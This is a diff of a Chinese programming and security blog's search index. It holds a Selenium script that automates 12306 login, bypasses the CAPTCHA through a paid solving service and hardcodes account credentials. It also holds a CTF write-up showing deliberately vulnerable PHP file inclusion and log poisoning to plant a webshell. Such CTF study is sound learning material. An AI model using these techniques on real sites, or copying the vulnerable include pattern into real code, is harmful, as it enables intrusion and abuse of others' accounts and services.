class="string">&#x27;ccc.jpg&#x27;</span>, im)&#125;</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://upload.chaojiying.net/Upload/Processing.php&#x27;</span>, data=params, files=files,</span><br><span class="line">                          headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ReportError</span>(<span class="params">self, im_id</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        im_id:报错题目的图片ID</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: im_id,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://upload.chaojiying.net/Upload/ReportError.php&#x27;</span>, data=params, headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line">option = ChromeOptions()</span><br><span class="line">option.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">bro = webdriver.Chrome(options=option)</span><br><span class="line"><span class="comment"># 12306的登录网址</span></span><br><span class="line">bro.get(<span class="string">&#x27;https://kyfw.12306.cn/otn/resources/login.html&#x27;</span>)</span><br><span class="line"><span class="comment"># 窗口最大化</span></span><br><span class="line">bro.maximize_window()</span><br><span class="line"><span class="comment">#bro.execute_script(&quot;document.body.style.zoom=&#x27;1.25&#x27;&quot;)</span></span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;/html/body/div[2]/div[2]/ul/li[2]/a&#x27;</span>).click()</span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-userName&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;L1yee01&#x27;</span>)</span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-password&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;ly0123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bro.save_screenshot(<span class="string">&#x27;aa.png&#x27;</span>)</span><br><span class="line"><span class="comment">#确定验证码图片对应的左上角和右下角的坐标（裁剪的区域就确定）</span></span><br><span class="line">code_img_ele = bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-loginImg&quot;]&#x27;</span>)</span><br><span class="line">location = code_img_ele.location <span class="comment"># 验证码图片左上角的坐标 x,y</span></span><br><span class="line"><span class="comment"># print(&#x27;location:&#x27;,location) #左上角1258 454   右下角1655 689    #+242 +162 +239 +100</span></span><br><span class="line">size = code_img_ele.size <span class="comment">#验证码标签对应的长和宽</span></span><br><span class="line"><span class="comment"># print(&#x27;size:&#x27;,size)</span></span><br><span class="line"><span class="comment">#左上角和右下角坐标  -62</span></span><br><span class="line">rangle=(<span class="number">1254</span>, <span class="number">360</span>, <span class="number">1652</span>, <span class="number">605</span>)</span><br><span class="line"><span class="comment">#至此验证码图片区域就确定下来了</span></span><br><span class="line">i = Image.<span class="built_in">open</span>(<span class="string">&#x27;./aa.png&#x27;</span>)</span><br><span class="line">code_img_name = <span class="string">&#x27;./code.png&#x27;</span></span><br><span class="line"><span class="comment">#crop根据指定区域进行图片裁剪</span></span><br><span class="line">frame = i.crop(rangle)</span><br><span class="line">frame.save(code_img_name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    chaojiying = Chaojiying_Client(<span class="string">&#x27;L1yee01&#x27;</span>, <span class="string">&#x27;x2R4.9dayAA3pca&#x27;</span>, <span class="string">&#x27;913264&#x27;</span>)</span><br><span class="line">    im = <span class="built_in">open</span>(<span class="string">&#x27;code.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    result=chaojiying.PostPic(im, <span class="number">9004</span>)[<span class="string">&#x27;pic_str&#x27;</span>]</span><br><span class="line">    <span class="comment">#print (chaojiying.PostPic(im, 9004))</span></span><br><span class="line">    all_list = []</span><br><span class="line">    chaojiying.ReportError(<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;|&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        list_1 = result.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">        count_1 = <span class="built_in">len</span>(list_1)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count_1):</span><br><span class="line">            xy_list = []</span><br><span class="line">            x = <span class="built_in">int</span>(list_1[i].split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">            y = <span class="built_in">int</span>(list_1[i].split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            xy_list.append(x)</span><br><span class="line">            xy_list.append(y)</span><br><span class="line">            all_list.append(xy_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(result.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        y = <span class="built_in">int</span>(result.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        xy_list = []</span><br><span class="line">        xy_list.append(x)</span><br><span class="line">        xy_list.append(y)</span><br><span class="line">        all_list.append(xy_list)</span><br><span class="line">    print(all_list)</span><br><span class="line"><span class="comment"># 移动光标进行点击验证码, 动作链移动光标</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> all_list:</span><br><span class="line">        x = a[<span class="number">0</span>]-<span class="number">6</span></span><br><span class="line">        y = a[<span class="number">1</span>]-<span class="number">8</span></span><br><span class="line">        <span class="comment">#先实例化对象</span></span><br><span class="line">        action = ActionChains(bro)</span><br><span class="line">        <span class="comment"># 先把坐标原点偏移到验证码的原点  # 实例化动作链并立即执行移动操作</span></span><br><span class="line">        action.move_to_element_with_offset(code_img_ele, x, y).click().perform()</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-login&quot;]&#x27;</span>).click()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
-      </categories>
-  </entry>
-  <entry>
     <title>初识scrapy框架</title>
     <url>/2021/02/27/%E5%88%9D%E8%AF%86scrapy%E6%A1%86%E6%9E%B6/</url>
     <content><![CDATA[<ul>
@@ -3274,6 +3253,27 @@ index.php</p>
 <p>scrapy基于xpath数据解析操作：</p>
 <h2 id="爬取糗事百科的段子数据"><a class="header-anchor" href="#爬取糗事百科的段子数据">¶</a>爬取糗事百科的段子数据:</h2>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="comment"># from test_scrapy.items import TestScrapyItem</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpidernameSpider</span>(<span class="params">scrapy.Spider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;spiderName&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;www.qiushibaike.com/text/&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.qiushibaike.com/text/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">        list_1 = response.xpath(<span class="string">&#x27;//div[@class=&quot;content-block clearfix&quot;]/div[@class=&quot;col1 old-style-col1&quot;]/div&#x27;</span>)</span><br><span class="line">        all_data=[]</span><br><span class="line">        <span class="keyword">for</span> div <span class="keyword">in</span> list_1:</span><br><span class="line">            author=div.xpath(<span class="string">&#x27;.//h2/text()&#x27;</span>)[<span class="number">0</span>].extract().strip()</span><br><span class="line">            content=div.xpath(<span class="string">&#x27;.//div[@class=&quot;content&quot;]/span[1]/text()&#x27;</span>).getall()</span><br><span class="line">            content=<span class="string">&quot;&quot;</span>.join(content)</span><br><span class="line">            print(<span class="string">&quot;作者: &quot;</span>+name_list)</span><br><span class="line">            print(<span class="string">&quot;文章: &quot;</span>+thing_list)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>使用超级鹰及selenium模块模拟登陆12306</title>
+    <url>/2021/02/26/%E4%BD%BF%E7%94%A8%E8%B6%85%E7%BA%A7%E9%B9%B0%E5%8F%8Aselenium%E6%A8%A1%E5%9D%97%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%8612306/</url>
+    <content><![CDATA[<p>完整代码如下</p>
+<p>吐槽一下图片定位和定位点击我都用了很笨的方法  因为正规老是有偏移</p>
+<h2 id="超级鹰介绍"><a class="header-anchor" href="#超级鹰介绍">¶</a>超级鹰介绍</h2>
+<p>网址: <a href="https://www.chaojiying.com/user/">https://www.chaojiying.com/user/</a></p>
+<p>进去后注册一个普通用户</p>
+<p>在开发文档下载python3的代码</p>
+<p>在软件id创建一个id  然后充值一块钱</p>
+<p><img src="https://img-blog.csdnimg.cn/20210226134331670.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="超级鹰使用介绍"><a class="header-anchor" href="#超级鹰使用介绍">¶</a>超级鹰使用介绍</h2>
+<p>代码拷贝下来后 可以用他的示例代码和图片进行测试 具体示例代码都有注释 自行查看</p>
+<h2 id="爬取12306完整代码"><a class="header-anchor" href="#爬取12306完整代码">¶</a>爬取12306完整代码</h2>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ChromeOptions</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chaojiying_Client</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, username, password, soft_id</span>):</span></span><br><span class="line">        self.username = username</span><br><span class="line">        password = password.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        self.password = md5(password).hexdigest()</span><br><span class="line">        self.soft_id = soft_id</span><br><span class="line">        self.base_params = &#123;</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: self.username,</span><br><span class="line">            <span class="string">&#x27;pass2&#x27;</span>: self.password,</span><br><span class="line">            <span class="string">&#x27;softid&#x27;</span>: self.soft_id,</span><br><span class="line">        &#125;</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PostPic</span>(<span class="params">self, im, codetype</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        im: 图片字节</span></span><br><span class="line"><span class="string">        codetype: 题目类型 参考 http://www.chaojiying.com/price.html</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;codetype&#x27;</span>: codetype,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        files = &#123;<span class="string">&#x27;userfile&#x27;</span>: (<span class="string">&#x27;ccc.jpg&#x27;</span>, im)&#125;</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://upload.chaojiying.net/Upload/Processing.php&#x27;</span>, data=params, files=files,</span><br><span class="line">                          headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ReportError</span>(<span class="params">self, im_id</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        im_id:报错题目的图片ID</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: im_id,</span><br><span class="line">        &#125;</span><br><span class="line">        params.update(self.base_params)</span><br><span class="line">        r = requests.post(<span class="string">&#x27;http://upload.chaojiying.net/Upload/ReportError.php&#x27;</span>, data=params, headers=self.headers)</span><br><span class="line">        <span class="keyword">return</span> r.json()</span><br><span class="line">option = ChromeOptions()</span><br><span class="line">option.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">bro = webdriver.Chrome(options=option)</span><br><span class="line"><span class="comment"># 12306的登录网址</span></span><br><span class="line">bro.get(<span class="string">&#x27;https://kyfw.12306.cn/otn/resources/login.html&#x27;</span>)</span><br><span class="line"><span class="comment"># 窗口最大化</span></span><br><span class="line">bro.maximize_window()</span><br><span class="line"><span class="comment">#bro.execute_script(&quot;document.body.style.zoom=&#x27;1.25&#x27;&quot;)</span></span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;/html/body/div[2]/div[2]/ul/li[2]/a&#x27;</span>).click()</span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-userName&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;L1yee01&#x27;</span>)</span><br><span class="line">bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-password&quot;]&#x27;</span>).send_keys(<span class="string">&#x27;ly0123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bro.save_screenshot(<span class="string">&#x27;aa.png&#x27;</span>)</span><br><span class="line"><span class="comment">#确定验证码图片对应的左上角和右下角的坐标（裁剪的区域就确定）</span></span><br><span class="line">code_img_ele = bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-loginImg&quot;]&#x27;</span>)</span><br><span class="line">location = code_img_ele.location <span class="comment"># 验证码图片左上角的坐标 x,y</span></span><br><span class="line"><span class="comment"># print(&#x27;location:&#x27;,location) #左上角1258 454   右下角1655 689    #+242 +162 +239 +100</span></span><br><span class="line">size = code_img_ele.size <span class="comment">#验证码标签对应的长和宽</span></span><br><span class="line"><span class="comment"># print(&#x27;size:&#x27;,size)</span></span><br><span class="line"><span class="comment">#左上角和右下角坐标  -62</span></span><br><span class="line">rangle=(<span class="number">1254</span>, <span class="number">360</span>, <span class="number">1652</span>, <span class="number">605</span>)</span><br><span class="line"><span class="comment">#至此验证码图片区域就确定下来了</span></span><br><span class="line">i = Image.<span class="built_in">open</span>(<span class="string">&#x27;./aa.png&#x27;</span>)</span><br><span class="line">code_img_name = <span class="string">&#x27;./code.png&#x27;</span></span><br><span class="line"><span class="comment">#crop根据指定区域进行图片裁剪</span></span><br><span class="line">frame = i.crop(rangle)</span><br><span class="line">frame.save(code_img_name)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    chaojiying = Chaojiying_Client(<span class="string">&#x27;L1yee01&#x27;</span>, <span class="string">&#x27;x2R4.9dayAA3pca&#x27;</span>, <span class="string">&#x27;913264&#x27;</span>)</span><br><span class="line">    im = <span class="built_in">open</span>(<span class="string">&#x27;code.png&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    result=chaojiying.PostPic(im, <span class="number">9004</span>)[<span class="string">&#x27;pic_str&#x27;</span>]</span><br><span class="line">    <span class="comment">#print (chaojiying.PostPic(im, 9004))</span></span><br><span class="line">    all_list = []</span><br><span class="line">    chaojiying.ReportError(<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;|&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        list_1 = result.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">        count_1 = <span class="built_in">len</span>(list_1)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count_1):</span><br><span class="line">            xy_list = []</span><br><span class="line">            x = <span class="built_in">int</span>(list_1[i].split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">            y = <span class="built_in">int</span>(list_1[i].split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            xy_list.append(x)</span><br><span class="line">            xy_list.append(y)</span><br><span class="line">            all_list.append(xy_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x = <span class="built_in">int</span>(result.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">0</span>])</span><br><span class="line">        y = <span class="built_in">int</span>(result.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        xy_list = []</span><br><span class="line">        xy_list.append(x)</span><br><span class="line">        xy_list.append(y)</span><br><span class="line">        all_list.append(xy_list)</span><br><span class="line">    print(all_list)</span><br><span class="line"><span class="comment"># 移动光标进行点击验证码, 动作链移动光标</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> all_list:</span><br><span class="line">        x = a[<span class="number">0</span>]-<span class="number">6</span></span><br><span class="line">        y = a[<span class="number">1</span>]-<span class="number">8</span></span><br><span class="line">        <span class="comment">#先实例化对象</span></span><br><span class="line">        action = ActionChains(bro)</span><br><span class="line">        <span class="comment"># 先把坐标原点偏移到验证码的原点  # 实例化动作链并立即执行移动操作</span></span><br><span class="line">        action.move_to_element_with_offset(code_img_ele, x, y).click().perform()</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    bro.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;J-login&quot;]&#x27;</span>).click()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>编程学习</category>
@@ -3431,43 +3431,6 @@ index.php</p>
       </categories>
   </entry>
   <entry>
-    <title>文件日志包含漏洞</title>
-    <url>/2020/11/17/%E6%96%87%E4%BB%B6%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>本文针对ctf中文件日志包含小结</p>
-<a id="more"></a>
-<h2 id="日志包含漏洞原因："><a class="header-anchor" href="#日志包含漏洞原因：">¶</a><strong>日志包含漏洞原因</strong>：</h2>
-<p>某php文件存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含Apache(看服务器是Apache还是nginx)日志文件也可以获取WebShell</p>
-<p><strong>注意：需要开启服务器记录日志功能</strong></p>
-<p><strong>访问日志的位置和文件名在不同的系统上会有所差异</strong></p>
-<p>apache一般是/var/log/apache/access.log。：</p>
-<p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</p>
-<p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 5615</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;style.css HTTP&#x2F;1.1&quot; 200 2415</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:29 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;img&#x2F;gifLogo.gif HTTP&#x2F;1.1&quot; 200 3525</span><br></pre></td></tr></table></figure>
-<p>当访问一个不存在的资源时，Apache日志同样会记录 例如访问http://127.0.0.1/<?php phpinfo();?>。Apache会记录请求“<?php phpinfo();?>”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞</p>
-<p>但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问http://127.0.0.1/<?php phpinfo();?> 就能生成包含一句话木马的access.log文件</p>
-<p><strong>下面我们来本地演示(使用的是phpstudy的apache)</strong></p>
-<h2 id="复现漏洞："><a class="header-anchor" href="#复现漏洞：">¶</a>复现漏洞：</h2>
-<h3 id="1、文件包含漏洞代码"><a class="header-anchor" href="#1、文件包含漏洞代码">¶</a>1、文件包含漏洞代码</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;file inlcude test&#39;;</span><br><span class="line">if(isset($_GET[&#39;rj45&#39;]))&#123;</span><br><span class="line">	include($_GET[&#39;rj45&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2020111621455822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201116214608390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="2、写入phpinfo"><a class="header-anchor" href="#2、写入phpinfo">¶</a>2、写入phpinfo()</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201116214621531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201116214643118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="3、写入一句话"><a class="header-anchor" href="#3、写入一句话">¶</a>3、写入一句话</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201116214715741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/fd06194d9f48c8c4c862b2598da592d1.png" alt="img"></p>
-<h3 id="查看日志"><a class="header-anchor" href="#查看日志">¶</a>查看日志</h3>
-<p><img src="https://img-blog.csdnimg.cn/20201116214751208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h2 id="相关ctf练习题"><a class="header-anchor" href="#相关ctf练习题">¶</a>相关ctf练习题</h2>
-<p><strong>ctfshow -web-4</strong></p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>文件包含</category>
-      </categories>
-  </entry>
-  <entry>
     <title>无数字字母rce</title>
     <url>/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce(ctfshow%20web%E5%85%A5%E9%97%A856)/</url>
     <content><![CDATA[<p>面对ctfshow web入门56的学习</p>
@@ -3508,6 +3471,43 @@ index.php</p>
       <categories>
         <category>web技术学习</category>
         <category>命令执行</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>文件日志包含漏洞</title>
+    <url>/2020/11/17/%E6%96%87%E4%BB%B6%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>本文针对ctf中文件日志包含小结</p>
+<a id="more"></a>
+<h2 id="日志包含漏洞原因："><a class="header-anchor" href="#日志包含漏洞原因：">¶</a><strong>日志包含漏洞原因</strong>：</h2>
+<p>某php文件存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含Apache(看服务器是Apache还是nginx)日志文件也可以获取WebShell</p>
+<p><strong>注意：需要开启服务器记录日志功能</strong></p>
+<p><strong>访问日志的位置和文件名在不同的系统上会有所差异</strong></p>
+<p>apache一般是/var/log/apache/access.log。：</p>
+<p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log</p>
+<p>Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 5615</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:28 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;style.css HTTP&#x2F;1.1&quot; 200 2415</span><br><span class="line">127.0.0.1 - - [02&#x2F;Dec&#x2F;2019:22:18:29 +0800] &quot;GET &#x2F;wampthemes&#x2F;classic&#x2F;img&#x2F;gifLogo.gif HTTP&#x2F;1.1&quot; 200 3525</span><br></pre></td></tr></table></figure>
+<p>当访问一个不存在的资源时，Apache日志同样会记录 例如访问http://127.0.0.1/<?php phpinfo();?>。Apache会记录请求“<?php phpinfo();?>”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞</p>
+<p>但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问http://127.0.0.1/<?php phpinfo();?> 就能生成包含一句话木马的access.log文件</p>
+<p><strong>下面我们来本地演示(使用的是phpstudy的apache)</strong></p>
+<h2 id="复现漏洞："><a class="header-anchor" href="#复现漏洞：">¶</a>复现漏洞：</h2>
+<h3 id="1、文件包含漏洞代码"><a class="header-anchor" href="#1、文件包含漏洞代码">¶</a>1、文件包含漏洞代码</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#39;file inlcude test&#39;;</span><br><span class="line">if(isset($_GET[&#39;rj45&#39;]))&#123;</span><br><span class="line">	include($_GET[&#39;rj45&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2020111621455822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201116214608390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="2、写入phpinfo"><a class="header-anchor" href="#2、写入phpinfo">¶</a>2、写入phpinfo()</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201116214621531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201116214643118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="3、写入一句话"><a class="header-anchor" href="#3、写入一句话">¶</a>3、写入一句话</h3>
+<p><img src="https://img-blog.csdnimg.cn/20201116214715741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
